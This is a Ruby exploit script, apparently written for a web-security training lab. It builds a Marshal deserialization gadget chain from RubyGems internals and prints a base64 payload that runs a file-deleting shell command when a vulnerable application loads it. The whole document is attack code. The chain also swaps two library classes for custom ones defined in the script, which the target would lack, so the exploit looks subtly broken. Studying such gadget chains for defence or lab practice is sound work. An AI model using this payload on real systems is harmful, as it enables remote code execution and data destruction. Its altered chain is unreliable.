require 'base64'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# Prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# Create a custom class to replace Net::WriteAdapter functionality
class CommandExecutor
  def initialize(cmd)
    @cmd = cmd
  end

  def write(*)
    system(@cmd)
  end
end

# Set up the command to execute
command = "rm /home/carlos/morale.txt"

# Configure the RequestSet to execute our command
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', CommandExecutor.new(command))
rs.instance_variable_set('@git_set', command)

# Set up the TarReader entry
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

# Configure the BufferedIO replacement
class BufferedIOReplacement
  def initialize(io, debug_output)
    @io = io
    @debug_output = debug_output
  end
end

n = BufferedIOReplacement.new(i, rs)

# Set up the TarReader
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

# Final requirement setup
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

# Generate and output the payload
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts "Base64 encoded payload:"
puts Base64.strict_encode64(payload)

# WARNING: Deserializing this will execute the command!
# Marshal.load(Base64.decode64(encoded_payload))
